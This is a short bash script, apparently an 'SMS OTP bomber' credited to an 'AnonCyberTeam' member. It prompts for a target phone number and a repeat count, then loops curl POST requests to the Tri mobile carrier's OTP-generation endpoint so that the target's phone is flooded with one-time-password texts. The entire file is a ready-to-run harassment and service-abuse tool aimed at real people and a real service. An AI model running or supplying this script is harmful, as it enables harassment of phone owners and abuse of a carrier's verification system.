#!/bin/bash

#source : https://github.com/bayufedra/bom-sms-otp-tri/
#Contact me : rizkyjovanka254@gmail.com

echo " 
 _______                         _______        __ 
|     __|.-----.---.-.--------. |_     _|.----.|__|
|__     ||  _  |  _  |        |   |   |  |   _||  |
|_______||   __|___._|__|__|__|   |___|  |__|  |__|
         |__|  Mr.Bro_Tx - AnonCyberTeam
"

url="https://registrasi.tri.co.id/daftar/generateOTP"
read -p "[+] Target Mu	: " target
read -p "[+] Jumlah	: " limit
echo -ne "\n"

for i in $(seq 1 $limit):
  do
	payload=$(curl -X POST --silent $url -d "msisdn=$target")
	echo -ne "[+] Status -> $payload\n"
done
